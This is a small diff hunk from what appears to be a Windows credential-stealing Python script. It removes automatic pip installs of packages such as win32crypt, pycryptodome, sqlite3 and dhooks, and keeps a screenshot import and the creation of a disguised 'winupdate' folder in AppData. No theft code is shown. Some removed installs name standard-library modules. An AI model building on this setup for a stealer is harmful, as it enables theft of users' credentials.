@@ -18,21 +18,7 @@ try:
     from mss import mss
     import requests
 except:
-    import os
-    os.system("pip install subprocess")
-    os.system("pip install sqlite3")
-    os.system("pip install wmi")
-    os.system("pip install zipfile")
-    os.system("pip install re")
-    os.system("pip install win32crypt")
-    os.system("pip install json")
-    os.system("pip install base64")
-    os.system("pip install shutil")
-    os.system("pip install requests")
-    os.system("pip install pycryptodome")
-    os.system("pip install datetime")
-    os.system("pip install dhooks")
-    os.system("pip install mss")
+    pass
     
 try:
     os.mkdir(os.environ["appdata"] + "/winupdate")
